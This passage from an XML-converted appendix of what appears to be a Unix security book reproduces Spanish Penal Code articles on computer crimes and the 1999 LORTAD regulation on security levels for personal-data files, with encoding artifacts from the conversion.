</para><!--l. 80--><para>  Lo dispuesto en este cap&#x02CA;&#x0131;tulo ser&#x00E1; aplicable al que descubriere, revelare o cediere datos reservados de
personas jur&#x02CA;&#x0131;dicas, sin el consentimiento de sus representantes, salvo lo dispuesto en otros preceptos de
este C&#x00F3;digo.
<!--br/-->Art&#x02CA;&#x0131;culo 201
</para><!--l. 87--><para>  1. Para proceder por los delitos previstos en este cap&#x02CA;&#x0131;tulo ser&#x00E1; necesaria denuncia de la persona agraviada
o de su representante legal. Cuando aquella sea menor de edad, incapaz o una persona desvalida, tambien
podr&#x00E1; denunciar el Ministerio Fiscal.
</para><!--l. 92--><para>  2. No ser&#x00E1; precisa la denuncia exigida en el apartado anterior para proceder por los hechos descritos en el
art&#x02CA;&#x0131;culo 198 de este C&#x00F3;digo, ni cuando la comisi&#x00F3;n del delito afecte a los intereses generales o a una
pluralidad de personas.
</para><!--l. 97--><para>  3. El perd&#x00F3;n del ofendido o de su representante legal, en su caso, extingue la acci&#x00F3;n penal o la pena
impuesta, sin perjuicio de lo dispuesto en el segundo p&#x00E1;rrafo del numero 4<informalequation><graphic 
fileref="unixsec555x.gif"></graphic></informalequation> del art&#x02CA;&#x0131;culo 130.
<!--br/-->Art&#x02CA;&#x0131;culo 248
</para><!--l. 103--><para>  1. Cometen estafa los que, con &#x00E1;nimo de lucro, utilizaren enga~no bastante para producir error en otro,
induci&#x00E9;ndolo a realizar un acto de disposici&#x00F3;n en perjuicio propio o ajeno.
</para><!--l. 107--><para>  2. Tambi&#x00E9;n se consideran reos de estafa los que, con &#x00E1;nimo de lucro, y vali&#x00E9;ndose de alguna manipulaci&#x00F3;n
inform&#x00E1;tica o arti&#xFB01;cio semejante consigan la transferencia no consentida de cualquier activo patrimonial en
perjuicio de tercero.
<!--br/-->Art&#x02CA;&#x0131;culo 263
</para><!--l. 114--><para>  El que causare da~nos en propiedad ajena no comprendidos en otros T&#x02CA;&#x0131;tulos de este C&#x00F3;digo, ser&#x00E1; castigado
con la pena de multa de seis a veinticuatro meses, atendidas la condici&#x00F3;n econ&#x00F3;mica de la v&#x02CA;&#x0131;ctima y la
cuant&#x02CA;&#x0131;a del da~no, si &#x00E9;ste excediera de cincuenta mil pesetas.
<!--br/-->Art&#x02CA;&#x0131;culo 264
</para><!--l. 121--><para>  1. Ser&#x00E1; castigado con la pena de prisi&#x00F3;n de uno a tres a~nos y multa de doce a veinticuatro meses el
que causare da~nos expresados en el art&#x02CA;&#x0131;culo anterior, si concurriera alguno de los supuestos
siguientes:
     </para><orderedlist 
>
     <listitem><anchor 
   id="x1-353003x1"  ></anchor>
     <!--l. 125--><para>Que  se  realicen  para  impedir  el  libre  ejercicio  de  la  autoridad  o  en  venganza  de  sus
     determinaciones,  bien  se  cometiere  el  delito  contra  funcionarios  publicos,  bien  contra
     particulares  que,  como  testigos  o  de  cualquier  otra  manera,  hayan  contribuido  o  pueden
     contribuir a la ejecucion o aplicacion de las Leyes o disposiciones generales.
     </para></listitem>
     <listitem><anchor 
   id="x1-353005x2"  ></anchor>
     <!--l. 130--><para>Que se cause por cualquier medio infecci&#x00F3;n o contagio de ganado.
     </para></listitem>
     <listitem><anchor 
   id="x1-353007x3"  ></anchor>
     <!--l. 131--><para>Que se empleen sustancias venenosas o corrosivas.
     </para></listitem>
     <listitem><anchor 
   id="x1-353009x4"  ></anchor>
     <!--l. 132--><para>Que afecten a bienes de dominio o uso p&#x00FA;blico o comunal.

     </para></listitem>
     <listitem><anchor 
   id="x1-353011x5"  ></anchor>
     <!--l. 133--><para>Que arruinen al perjudicado o se le coloque en grave situaci&#x00F3;n econ&#x00F3;mica.</para></listitem></orderedlist>
<!--l. 137--><para>  2. La misma pena se impondr&#x00E1; al que por cualquier medio destruya, altere, inutilice o de cualquier otro
modo da~ne los datos, programas o documentos electr&#x00F3;nicos ajenos contenidos en redes, soportes o sistemas
inform&#x00E1;ticos.
</para><!--l. 142--><para>
</para><section role="center"><title/>
<!--l. 142--><para> CAP&#x00CD;TULO XI
</para><!--l. 144--><para>De los delitos relativos a la propiedad intelectual e industrial, al mercado y a los consumidores</para></section>
<!--l. 148--><para>
</para><section role="center"><title/>
<!--l. 148--><para> Secci&#x00F3;n 1<informalequation><graphic 
fileref="unixsec556x.gif"></graphic></informalequation>.- DE LOS DELITOS RELATIVOS A LA PROPIEDAD INTELECTUAL.</para></section>
<!--l. 152--><para>Art&#x02CA;&#x0131;culo 270
</para><!--l. 154--><para>  Ser&#x00E1; castigado con la pena de prisi&#x00F3;n de seis meses a dos a~nos o de multa de seis a veinticuatro meses
quien, con &#x00E1;nimo de lucro y en perjuicio de tercero, reproduzca, plagie, distribuya o comunique
p&#x00FA;blicamente, en todo o en parte, una obra literaria, art&#x02CA;&#x0131;stica o cient&#x02CA;&#x0131;&#xFB01;ca, o su transformaci&#x00F3;n, interpretaci&#x00F3;n
o ejecuci&#x00F3;n art&#x02CA;&#x0131;stica &#xFB01;jada en cualquier tipo de soporte o comunicada a trav&#x00E9;s de cualquier medio, sin la
autorizaci&#x00F3;n de los titulares de los correspondientes derechos de propiedad intelectual o de sus
cesionarios.
<!--br/-->
</para><!--l. 163--><para>  La misma pena se impondr&#x00E1; a quien intencionadamente importe, exporte o almacene ejemplares de dichas
obras o producciones o ejecuciones sin la referida autorizaci&#x00F3;n.
<!--br/-->
</para><!--l. 167--><para>  Ser&#x00E1; castigada tambi&#x00E9;n con la misma pena la fabricaci&#x00F3;n, puesta en circulaci&#x00F3;n y tenencia de
cualquier medio espec&#x02CA;&#x0131;&#xFB01;camente destinada a facilitar la supresi&#x00F3;n no autorizada o la neutralizaci&#x00F3;n
de cualquier dispositivo t&#x00E9;cnico que se haya utilizado para proteger programas de ordenador.
<!--br/-->Art&#x02CA;&#x0131;culo 278
</para><!--l. 175--><para>  1. El que, para descubrir un secreto de empresa se apoderare por cualquier medio de datos, documentos
escritos o electr&#x00F3;nicos, soportes inform&#x00E1;ticos u otros objetos que se re&#xFB01;eran al mismo, o empleare alguno de
los medios o instrumentos se~nalados en el apartado 1 del art&#x02CA;&#x0131;culo 197, ser&#x00E1; castigado con la pena de prisi&#x00F3;n
de dos a cuatro a~nos y multa de doce a veinticuatro meses.
</para><!--l. 182--><para>  2. Se impondr&#x00E1; la pena de prisi&#x00F3;n de tres a cinco a~nos y multa de doce a veinticuatro meses si se
difundieren, revelaren o cedieren a terceros los secretos descubiertos.
</para><!--l. 186--><para>  3. Lo dispuesto en el presente art&#x02CA;&#x0131;culo se entender&#x00E1; sin perjuicio de las penas que pudieran corresponder
por el apoderamiento o destrucci&#x00F3;n de los soportes inform&#x00E1;ticos.
</para><!--l. 190--><para>
</para><section role="center"><title/>
<!--l. 190--><para> CAP&#x00CD;TULO III
</para><!--l. 192--><para>Disposici&#x00F3;n general</para></section>
<!--l. 194--><para>Art&#x02CA;&#x0131;culo 400
</para><!--l. 196--><para>  La fabricaci&#x00F3;n o tenencia de &#x00FA;tiles, materiales, instrumentos, sustancias, m&#x00E1;quinas, programas de ordenador
o aparatos, espec&#x02CA;&#x0131;&#xFB01;camente destinados a la comisi&#x00F3;n de los delitos descritos en los cap&#x02CA;&#x0131;tulos anteriores, se
castigar&#x00E1;n con la pena se~nalada en cada paso para los autores.
<!--br/-->Art&#x02CA;&#x0131;culo 536

</para><!--l. 204--><para>  La autoridad, funcionario p&#x00FA;blico o agente de estos que, mediando causa por delito, interceptare las
telecomunicaciones o utilizare arti&#xFB01;cios t&#x00E9;cnicos de escuchas, transmisi&#x00F3;n, grabaci&#x00F3;n o reproducci&#x00F3;n del sonido,
de la imagen o de cualquier otra se~nal de comunicaci&#x00F3;n, con violaci&#x00F3;n de las garant&#x02CA;&#x0131;as constitucionales o
legales, incurrir&#x00E1; en la pena de inhabilitaci&#x00F3;n especial para empleo o cargo p&#x00FA;blico de dos a seis
a~nos.
<!--br/-->
</para><!--l. 211--><para>  Si divulgare o revelare la informaci&#x00F3;n obtenida, se impondr&#x00E1;n las penas de inhabilitaci&#x00F3;n especial, en su
mitad superior y, adem&#x00E1;s la de multa de seis a dieciocho meses.

  </para></section><!--end section--><!--l. 215--><section 
role="section"><title><abbrev role="title-mark">B.2</abbrev><anchor 
   id="x1-354000B.2"  ></anchor>Reglamento de Seguridad de la LORTAD</title>
<!--l. 218--><para>  <anchor 
   id="x1-354001f0"  ></anchor><footnote><para>   Reglamento de Medidas de Seguridad de los &#xFB01;cheros automatizados que contengan datos de car&#x00E1;cter personal, aprobado
  por el Real Decreto 994/1999, de 11 de junio.</para></footnote>
</para><section role="center"><title/>
<!--l. 219--><para> CAP&#x00CD;TULO I
</para><!--l. 220--><para>Disposiciones Generales</para></section>
<!--l. 223--><para>Art&#x02CA;&#x0131;culo 1. &#x00C1;mbito de aplicaci&#x00F3;n y &#xFB01;nes.
</para><!--l. 225--><para>  El presente Reglamento tiene por objeto establecer las medidas de &#x02CA;&#x0131;ndole t&#x00E9;cnica y organizativas
necesarias para garantizar la seguridad que deben reunir los &#xFB01;cheros automatizados, los centros de
tratamiento, locales, equipos, sistemas, programas y las personas que intervengan en el tratamiento
automatizado de los datos de car&#x00E1;cter personal sujetos al r&#x00E9;gimen de la Ley Org&#x00E1;nica 5/1992, de 29
de octubre, de Regulaci&#x00F3;n del Tratamiento Automatizado de los Datos de car&#x00E1;cter personal.
<!--br/-->Art&#x02CA;&#x0131;culo 2. De&#xFB01;niciones.
</para><!--l. 235--><para>  A efectos de este Reglamento, se entender&#x00E1; por:
     </para><itemizedlist>
     <listitem>
     <!--l. 237--><para>Sistema de informaci&#x00F3;n: Conjunto de &#xFB01;cheros automatizados, programas, soportes y equipos
     empleados para el almacenamiento y tratamiento de datos de car&#x00E1;cter personal.
     </para></listitem>
     <listitem>
     <!--l. 240--><para>Usuario: Sujeto o proceso autorizado para acceder a datos o recursos.
     </para></listitem>
     <listitem>
     <!--l. 242--><para>Recurso: Cualquier parte componente de un sistema de informaci&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 244--><para>Accesos  autorizados: Autorizaciones  concedidas  a  un  usuario  para  la  utilizaci&#x00F3;n  de  los
     diversos recursos.
     </para></listitem>
     <listitem>
     <!--l. 246--><para>Identi&#xFB01;caci&#x00F3;n: Procedimiento de reconocimiento de la identidad de un usuario.
     </para></listitem>
     <listitem>
     <!--l. 248--><para>Autenticaci&#x00F3;n: Procedimiento de comprobaci&#x00F3;n de la identidad de un usuario.
     </para></listitem>
     <listitem>
     <!--l. 250--><para>Control de acceso: Mecanismo que en funci&#x00F3;n a la identi&#xFB01;caci&#x00F3;n ya autenticada permite
     acceder a datos o recursos.
     </para></listitem>
     <listitem>
     <!--l. 252--><para>Contrase~na:  Informaci&#x00F3;n  con&#xFB01;dencial,  frecuentemente  constituida  por  una  cadena  de
     caracteres, que puede ser usada en la autenticaci&#x00F3;n de un usuario.

     </para></listitem>
     <listitem>
     <!--l. 255--><para>Incidencia: Cualquier anomal&#x02CA;&#x0131;a que afecte o pudiera afectar a la seguridad de los datos.
     </para></listitem>
     <listitem>
     <!--l. 257--><para>Soporte: Objeto f&#x02CA;&#x0131;sico susceptible de ser tratado en un sistema de informaci&#x00F3;n sobre el cual
     se pueden grabar o recuperar datos.
     </para></listitem>
     <listitem>
     <!--l. 259--><para>Responsable de seguridad: Persona o personas de la organizaci&#x00F3;n a las que el responsable del
     &#xFB01;chero ha asignado formalmente la funci&#x00F3;n de coordinar y controlar las medidas de seguridad
     aplicables.
     </para></listitem>
     <listitem>
     <!--l. 262--><para>Copia de respaldo: Copia de los datos de un &#xFB01;chero automatizado en un soporte que
     posibilite su recuperaci&#x00F3;n.</para></listitem></itemizedlist>
<!--l. 266--><para>Art&#x02CA;&#x0131;culo 3. Niveles de seguridad.
</para><!--l. 268--><para>  1. Las medidas de seguridad exigibles se clasi&#xFB01;can en tres niveles: b&#x00E1;sico, medio y alto.
<!--br/-->
</para><!--l. 271--><para>  2. Dichos niveles se establecen atendiendo a la naturaleza de la informaci&#x00F3;n tratada, en relaci&#x00F3;n con la
mayor o menor necesidad de garantizar la con&#xFB01;dencialidad y la integridad de la informaci&#x00F3;n.
<!--br/-->Art&#x02CA;&#x0131;culo 4. Aplicaci&#x00F3;n de los niveles de seguridad.
</para><!--l. 277--><para>  1. Todos los &#xFB01;cheros que contengan datos de car&#x00E1;cter personal deber&#x00E1;n adoptar las medidas de seguridad
cali&#xFB01;cadas como de nivel b&#x00E1;sico.
<!--br/-->
</para><!--l. 281--><para>  2. Los &#xFB01;cheros que contengan datos relativos a la comisi&#x00F3;n de infracciones administrativas o penales,
Hacienda P&#x00FA;blica, servicios &#xFB01;nancieros y aquellos &#xFB01;cheros cuyo funcionamiento se rija por el art&#x02CA;&#x0131;culo 28 de
la Ley Org&#x00E1;nica 5/1992, deber&#x00E1;n reunir, adem&#x00E1;s de las medidas de nivel b&#x00E1;sico, las cali&#xFB01;cadas como de nivel
medio.
<!--br/-->
</para><!--l. 287--><para>  3. Los &#xFB01;cheros que contengan datos de ideolog&#x02CA;&#x0131;a, religi&#x00F3;n, creencias, origen racial, salud o vida sexual,
as&#x02CA;&#x0131; como los que contengan datos recabados para &#xFB01;nes policiales sin consentimiento de las personas
afectadas deber&#x00E1;n reunir, adem&#x00E1;s de las medidas de nivel b&#x00E1;sico y medio, las cali&#xFB01;cadas como de nivel
alto.
<!--br/-->
</para><!--l. 293--><para>  4. Cuando los &#xFB01;cheros contengan un conjunto de datos de car&#x00E1;cter personal su&#xFB01;cientes que permitan
obtener una evaluaci&#x00F3;n de la personalidad del individuo deber&#x00E1;n garantizar las medidas de nivel medio
establecidas en los art&#x02CA;&#x0131;culos 17, 18, 19 y 20.
<!--br/-->
</para><!--l. 298--><para>  5. Cada uno de los niveles descritos anteriormente tienen la condici&#x00F3;n de m&#x02CA;&#x0131;nimos exigibles, sin perjuicio
de las disposiciones legales o reglamentarias espec&#x02CA;&#x0131;&#xFB01;cas vigentes.
<!--br/-->Art&#x02CA;&#x0131;culo 5. Acceso a datos a trav&#x00E9;s de redes de comunicaciones.
</para><!--l. 305--><para>  Las medidas de seguridad exigibles a los accesos a datos de car&#x00E1;cter personal a trav&#x00E9;s de redes de
comunicaciones deber&#x00E1;n garantizar un nivel de seguridad equivalente al correspondiente a los accesos en
modo local.
<!--br/-->Art&#x02CA;&#x0131;culo 6. R&#x00E9;gimen de trabajo fuera de los locales de ubicaci&#x00F3;n del &#xFB01;chero.
</para><!--l. 312--><para>  La ejecuci&#x00F3;n de tratamiento de datos de car&#x00E1;cter personal fuera de los locales de la ubicaci&#x00F3;n del &#xFB01;chero
deber&#x00E1; ser autorizada expresamente por el responsable del &#xFB01;chero y, en todo caso, deber&#x00E1; garantizarse el
nivel de seguridad correspondiente al tipo de &#xFB01;chero tratado.

<!--br/-->Art&#x02CA;&#x0131;culo 7. Ficheros temporales.
</para><!--l. 319--><para>  1. Los &#xFB01;cheros temporales deber&#x00E1;n cumplir el nivel de seguridad que les corresponda con arreglo a los
criterios establecidos en el presente Reglamento.
<!--br/-->
</para><!--l. 323--><para>  2. Todo &#xFB01;chero temporal ser&#x00E1; borrado una vez que haya dejado de ser necesario para los &#xFB01;nes que
motivaron su creaci&#x00F3;n.
</para><section role="center"><title/>
<!--l. 325--><para> CAP&#x00CD;TULO II
</para><!--l. 326--><para>Medidas de seguridad de nivel b&#x00E1;sico</para></section>
<!--l. 329--><para>Art&#x02CA;&#x0131;culo 8. Documento de seguridad.
</para><!--l. 331--><para>  1. El responsable del &#xFB01;chero elaborar&#x00E1; e implantar&#x00E1; la normativa de seguridad, mediante un documento de
obligado cumplimiento para el personal con acceso a los datos automatizados de car&#x00E1;cter personal y a los
sistemas de informaci&#x00F3;n.
<!--br/-->
</para><!--l. 336--><para>  2. El documento deber&#x00E1; contener, como m&#x02CA;&#x0131;nimo, los siguientes aspectos:
     </para><itemizedlist>
     <listitem>
     <!--l. 339--><para>&#x00C1;mbito de aplicaci&#x00F3;n del documento con especi&#xFB01;caci&#x00F3;n detallada de los recursos protegidos.
     </para></listitem>
     <listitem>
     <!--l. 341--><para>Medidas, normas, procedimientos, reglas y est&#x00E1;ndares encaminados a garantizar el nivel de
     seguridad exigido en este Reglamento.
     </para></listitem>
     <listitem>
     <!--l. 343--><para>Funciones y obligaciones del personal.
     </para></listitem>
     <listitem>
     <!--l. 344--><para>Estructura  de  los  &#xFB01;cheros  con  datos  de  car&#x00E1;cter  personal  y  descripci&#x00F3;n  de  los  sistemas  de
     informaci&#x00F3;n que los tratan.
     </para></listitem>
     <listitem>
     <!--l. 346--><para>Procedimiento de noti&#xFB01;caci&#x00F3;n, gesti&#x00F3;n y respuesta ante las incidencias.
     </para></listitem>
     <listitem>
     <!--l. 348--><para>Los procedimientos de realizaci&#x00F3;n de copias de respaldo y de recuperaci&#x00F3;n de los datos.</para></listitem></itemizedlist>
<!--l. 352--><para>  3. El documento deber&#x00E1; mantenerse en todo momento actualizado y deber&#x00E1; ser revisado siempre que se
produzcan cambios en el sistema de informaci&#x00F3;n o en la organizaci&#x00F3;n.
<!--br/-->
</para><!--l. 356--><para>  4 El contenido del documento deber&#x00E1; adecuarse, en todo momento, a las disposiciones vigentes en
materia de seguridad de los datos de car&#x00E1;cter personal.
<!--br/-->Art&#x02CA;&#x0131;culo 9. Funciones y obligaciones del personal.
</para><!--l. 362--><para>  1. Las funciones y obligaciones de cada una de las personas con acceso a los datos de car&#x00E1;cter personal y
a los sistemas de informaci&#x00F3;n estar&#x00E1;n claramente de&#xFB01;nidas y documentadas, de acuerdo con lo previsto en el
art&#x02CA;&#x0131;culo 8.2.(c).
<!--br/-->

</para><!--l. 367--><para>  2. El responsable del &#xFB01;chero adoptar&#x00E1; las medidas necesarias para que el personal conozca las normas de
seguridad que afecten al desarrollo de sus funciones as&#x02CA;&#x0131; como las consecuencias en que pudiera incurrir en
caso de incumplimiento.
<!--br/-->Art&#x02CA;&#x0131;culo 10. Registro de incidencias.
</para><!--l. 374--><para>  El procedimiento de noti&#xFB01;caci&#x00F3;n y gesti&#x00F3;n de incidencias contendr&#x00E1; necesariamente un registro en el que
se haga constar el tipo de incidencia, el momento en que se ha producido, la persona que
realiza la noti&#xFB01;caci&#x00F3;n, a qui&#x00E9;n se le comunica y los efectos que se hubieran derivado de la misma.
<!--br/-->Art&#x02CA;&#x0131;culo 11. Identi&#xFB01;caci&#x00F3;n y autenticaci&#x00F3;n.
</para><!--l. 381--><para>  1. El responsable del &#xFB01;chero se encargar&#x00E1; de que exista una relaci&#x00F3;n actualizada de usuarios que tengan
acceso al sistema de informaci&#x00F3;n y de establecer procedimientos de identi&#xFB01;caci&#x00F3;n y autenticaci&#x00F3;n para dicho
acceso.
<!--br/-->
</para><!--l. 386--><para>  2. Cuando el mecanismo de autenticaci&#x00F3;n se base en la existencia de contrase~nas existir&#x00E1; un
procedimiento de asignaci&#x00F3;n, distribuci&#x00F3;n y almacenamiento que garantice su con&#xFB01;dencialidad e
integridad.
<!--br/-->
</para><!--l. 390--><para>  3. Las contrase~nas se cambiar&#x00E1;n con la periodicidad que se determine en el documento de seguridad y
mientras est&#x00E9;n vigentes se almacenar&#x00E1;n de forma ininteligible.
<!--br/-->Art&#x02CA;&#x0131;culo 12. Control de acceso.
</para><!--l. 396--><para>  1. Los usuarios tendr&#x00E1;n acceso autorizado &#x00FA;nicamente a aquellos datos y recursos que precisen para el
desarrollo de sus funciones.
<!--br/-->
</para><!--l. 399--><para>  2. El responsable del &#xFB01;chero establecer&#x00E1; mecanismos para evitar que un usuario pueda acceder a datos o
recursos con derechos distintos de los autorizados.
<!--br/-->
</para><!--l. 403--><para>  3. La relaci&#x00F3;n de usuarios a la que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 11.1 de este Reglamento contendr&#x00E1; los derechos de
acceso autorizados para cada uno de ellos.
<!--br/-->
</para><!--l. 407--><para>  4. Exclusivamente el personal autorizado para ello en el documento de seguridad podr&#x00E1; conceder, alterar
o anular el acceso autorizado sobre los datos y recursos, conforme a los criterios establecidos por el
responsable del &#xFB01;chero.
<!--br/-->Art&#x02CA;&#x0131;culo 13. Gesti&#x00F3;n de soportes.
</para><!--l. 414--><para>  1. Los soportes inform&#x00E1;ticos que contengan datos de car&#x00E1;cter personal deber&#x00E1;n permitir identi&#xFB01;car el tipo
de informaci&#x00F3;n que contienen, ser inventariados y almacenarse en un lugar con acceso restringido al
personal autorizado para ello en el documento de seguridad.
<!--br/-->
</para><!--l. 419--><para>  2. La salida de soportes inform&#x00E1;ticos que contengan datos de car&#x00E1;cter personal, fuera de los locales
en que est&#x00E9; ubicado el &#xFB01;chero, &#x00FA;nicamente podr&#x00E1; ser autorizada por el responsable del &#xFB01;chero.
<!--br/-->Art&#x02CA;&#x0131;culo 14. Copias de respaldo y recuperaci&#x00F3;n
</para><!--l. 425--><para>  1. El responsable de &#xFB01;chero se encargar&#x00E1; de veri&#xFB01;car la de&#xFB01;nici&#x00F3;n y correcta aplicaci&#x00F3;n de los
procedimientos de realizaci&#x00F3;n de copias de respaldo y de recuperaci&#x00F3;n de los datos.
<!--br/-->
</para><!--l. 429--><para>  2. Los procedimientos establecidos para la realizaci&#x00F3;n de copias de respaldo y para la recuperaci&#x00F3;n de los
datos deber&#x00E1; garantizar su reconstrucci&#x00F3;n en el estado en que se encontraban al tiempo de producirse la
p&#x00E9;rdida o destrucci&#x00F3;n.
</para><!--l. 434--><para>  3. Deber&#x00E1;n realizarse copias de respaldo, al menos semanalmente, salvo que en dicho per&#x02CA;&#x0131;odo no se
hubiera producido ninguna actualizaci&#x00F3;n de los datos.
</para><section role="center"><title/>
<!--l. 437--><para> CAP&#x00CD;TULO III
</para><!--l. 438--><para>Medidas de seguridad de nivel medio</para></section>

<!--l. 441--><para>Art&#x02CA;&#x0131;culo 15. Documento de seguridad.
</para><!--l. 443--><para>  El documento de seguridad deber&#x00E1; contener, adem&#x00E1;s de lo dispuesto en el articulo 8 del presente
Reglamento, la identi&#xFB01;caci&#x00F3;n del responsable o responsables de seguridad, los controles peri&#x00F3;dicos que se
deban realizar para veri&#xFB01;car el cumplimiento de lo dispuesto en el propio documento y las
medidas que sea necesario adoptar cuando un soporte vaya a ser desechado o reutilizado.
<!--br/-->Art&#x02CA;&#x0131;culo 16. Responsable de seguridad.
</para><!--l. 452--><para>  El responsable del &#xFB01;chero designar&#x00E1; uno o varios responsables de seguridad encargados de coordinar y
controlar las medidas de&#xFB01;nidas en el documento de seguridad. En ning&#x00FA;n caso esta designaci&#x00F3;n supone una
delegaci&#x00F3;n de la responsabilidad que corresponde al responsable del &#xFB01;chero de acuerdo con este Reglamento.
<!--br/-->Art&#x02CA;&#x0131;culo 17. Auditor&#x02CA;&#x0131;a.
</para><!--l. 460--><para>  1. Los sistemas de informaci&#x00F3;n e instalaciones de tratamiento de datos se someter&#x00E1;n a una
auditor&#x02CA;&#x0131;a interna o externa, que veri&#xFB01;que el cumplimiento del presente Reglamento, de los
procedimientos e instrucciones vigentes en materia de seguridad de datos, al menos, cada dos
a~nos.
<!--br/-->
</para><!--l. 465--><para>  2. El informe de auditor&#x02CA;&#x0131;a deber&#x00E1; dictaminar sobre la adecuaci&#x00F3;n de las medidas y controles al presente
Reglamento, identi&#xFB01;car sus de&#xFB01;ciencias y proponer las medidas correctoras o complementarias necesarias.
Deber&#x00E1;, igualmente, incluir los datos, hechos y observaciones en que se basen los dict&#x00E1;menes alcanzados y
recomendaciones propuestas.
<!--br/-->
</para><!--l. 471--><para>  3. Los informes de auditor&#x02CA;&#x0131;a ser&#x00E1;n analizados por el responsable de seguridad competente, que elevar&#x00E1; las
conclusiones al responsable del &#xFB01;chero para que adopte las medidas correctoras adecuadas y quedar&#x00E1;n a
disposici&#x00F3;n de la Agencia de Protecci&#x00F3;n de Datos.
<!--br/-->Art&#x02CA;&#x0131;culo 18. Identi&#xFB01;caci&#x00F3;n y autenticaci&#x00F3;n.
</para><!--l. 478--><para>  1. El responsable del &#xFB01;chero establecer&#x00E1; un mecanismo que permita la identi&#xFB01;caci&#x00F3;n de forma inequ&#x02CA;&#x0131;voca y
personalizado de todo aquel usuario que intente acceder al sistema de informaci&#x00F3;n y la veri&#xFB01;caci&#x00F3;n de que est&#x00E1;
autorizado.
<!--br/-->
</para><!--l. 483--><para>  2. Se limitar&#x00E1; la posibilidad de intentar reiteradamente el acceso no autorizado al sistema de informaci&#x00F3;n.
<!--br/-->Art&#x02CA;&#x0131;culo 19. Control de acceso f&#x02CA;&#x0131;sico.
</para><!--l. 488--><para>  Exclusivamente el personal autorizado en el documento de seguridad podr&#x00E1; tener acceso
a los locales donde se encuentren los sistemas de informaci&#x00F3;n con datos de car&#x00E1;cter personal.
<!--br/-->Art&#x02CA;&#x0131;culo 20. Gesti&#x00F3;n de soportes.
</para><!--l. 494--><para>  1. Deber&#x00E1; establecerse un sistema de registro de entrada de soportes inform&#x00E1;ticos que permita, directa o
indirectamente, conocer el tipo de soporte, la fecha y hora, el emisor, el n&#x00FA;mero de soportes, el tipo de
informaci&#x00F3;n que contienen, la forma de env&#x02CA;&#x0131;o y la persona responsable de la recepci&#x00F3;n que deber&#x00E1; estar
debidamente autorizada.
<!--br/-->
</para><!--l. 500--><para>  2. Igualmente, se dispondr&#x00E1; de un sistema de registro de salida de soportes inform&#x00E1;ticos que permita,
directa o indirectamente, conocer el tipo de soporte, la fecha v hora, el destinatario, el n&#x00FA;mero de soportes,
el tipo de informaci&#x00F3;n que contienen, la forma de env&#x02CA;&#x0131;o y la persona responsable de la entrega que deber&#x00E1;
estar debidamente autorizada.
<!--br/-->
</para><!--l. 506--><para>  3. Cuando un soporte vaya a ser desechado o reutilizado, se adoptar&#x00E1;n las medidas necesarias para
impedir cualquier recuperaci&#x00F3;n posterior de la informaci&#x00F3;n almacenada en &#x00E9;l, previamente a que se proceda a
su baja en el inventario.
<!--br/-->
</para><!--l. 511--><para>  4. Cuando los soportes vayan a salir fuera de los locales en que encuentren ubicados los &#xFB01;cheros como
consecuencia de operaciones de mantenimiento, se adoptar&#x00E1;n las medidas necesarias para impedir cualquier

recuperaci&#x00F3;n indebida de la informaci&#x00F3;n almacenada en ellos.
<!--br/-->Art&#x02CA;&#x0131;culo 21. Registro de incidencias.
</para><!--l. 518--><para>  1. En el registro regulado en el art&#x02CA;&#x0131;culo 10 deber&#x00E1;n consignarse, adem&#x00E1;s los procedimientos
realizados de recuperaci&#x00F3;n de los datos, indicando la persona que ejecut&#x00F3; el proceso, los datos
restaurados y, en su caso, qu&#x00E9; datos ha sido necesario grabar manualmente en el proceso de
recuperaci&#x00F3;n.
<!--br/-->
</para><!--l. 524--><para>  2. Ser&#x00E1; necesaria la autorizaci&#x00F3;n por escrito del responsable del &#xFB01;chero para la ejecuci&#x00F3;n de los
procedimientos de recuperaci&#x00F3;n de los datos.
<!--br/-->Art&#x02CA;&#x0131;culo 22. Pruebas con datos reales.
</para><!--l. 530--><para>  Las pruebas anteriores a la implantaci&#x00F3;n o modi&#xFB01;caci&#x00F3;n de los sistemas de informaci&#x00F3;n que traten &#xFB01;cheros
con datos de car&#x00E1;cter personal no se realizar&#x00E1;n con datos reales, salvo que se asegure el nivel de seguridad
correspondiente al tipo de &#xFB01;chero tratado.
</para><section role="center"><title/>
<!--l. 534--><para> CAP&#x00CD;TULO IV
</para><!--l. 535--><para>Medidas de seguridad de nivel alto</para></section>
<!--l. 538--><para>Art&#x02CA;&#x0131;culo 23. Distribuci&#x00F3;n de soportes.
</para><!--l. 540--><para>  La distribuci&#x00F3;n de los soportes que contengan datos de car&#x00E1;cter personal se realizar&#x00E1; cifrando dichos datos o
bien utilizando cualquier otro mecanismo que garantice que dicha informaci&#x00F3;n no sea inteligible ni
manipulada durante su transporte.
<!--br/-->Art&#x02CA;&#x0131;culo 24. Registro de accesos.
</para><!--l. 547--><para>  1. De cada acceso se guardar&#x00E1;n, como m&#x02CA;&#x0131;nimo, la identi&#xFB01;caci&#x00F3;n del usuario, la fecha y hora en que se
realiz&#x00F3;, el &#xFB01;chero accedido, el tipo de acceso y si ha sido autorizado o denegado.
<!--br/-->
</para><!--l. 551--><para>  2. En el caso de que el acceso haya sido autorizado, ser&#x00E1; preciso guardar la informaci&#x00F3;n que permita
identi&#xFB01;car el registro accedido.
<!--br/-->
</para><!--l. 554--><para>  3. Los mecanismos que permiten el registro de los datos detallados en los p&#x00E1;rrafos anteriores estar&#x00E1;n bajo
el control directo del responsable de seguridad sin que se deba permitir, en ning&#x00FA;n caso, la desactivaci&#x00F3;n de
los mismos.
<!--br/-->
</para><!--l. 559--><para>  4. El periodo m&#x02CA;&#x0131;nimo de conservaci&#x00F3;n de los datos registrados ser&#x00E1; de dos a~nos.
<!--br/-->
</para><!--l. 562--><para>  5. El responsable de seguridad competente se encargar&#x00E1; de revisar peri&#x00F3;dicamente la informaci&#x00F3;n de control
registrada y elaborar&#x00E1; un informe de las revisiones realizadas y los problemas detectados al menos una vez
al mes.
<!--br/-->Art&#x02CA;&#x0131;culo 25. Copias de respaldo y recuperaci&#x00F3;n.
</para><!--l. 569--><para>  Deber&#x00E1; conservarse una copia de respaldo y de los procedimientos de recuperaci&#x00F3;n de los datos en un lugar
diferente de aqu&#x00E9;l en que se encuentren los equipos inform&#x00E1;ticos que los tratan cumpliendo en todo caso, las
medidas de seguridad exigidas en este Reglamento.
<!--br/-->Art&#x02CA;&#x0131;culo 26. Telecomunicaciones.
</para><!--l. 576--><para>  La transmisi&#x00F3;n de datos de car&#x00E1;cter personal a trav&#x00E9;s de redes de telecomunicaciones se realizar&#x00E1; cifrando
dichos datos o bien utilizando cualquier otro mecanismo que garantice que la informaci&#x00F3;n no sea inteligible
ni manipulada por terceros.
</para><section role="center"><title/>
